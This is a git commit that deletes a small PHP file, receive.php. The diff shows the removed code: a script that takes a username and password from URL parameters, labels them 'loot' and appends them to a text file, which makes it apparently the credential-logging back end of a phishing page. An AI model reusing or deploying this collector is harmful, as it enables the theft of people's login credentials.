759357dafb346a4d3446e6d8282ff41ac31409a7
unknown <igor.l.leonhardt@gmail.com>
2022-06-24 08:35:56 -0300

    Delete receive.php

--- receive.php
+++
@@ -1,9 +0,0 @@
-<?php
-$file = fopen("cd.txt", "a") or die("Unable to open file!");
-$user = $_GET['u'];
-$pass = $_GET['p'];
-$loot_ = '%s : %s';
-$loot = sprintf($loot_, $user, $pass);
-fwrite($file, "\n". $loot);
-fclose($file);
-?>
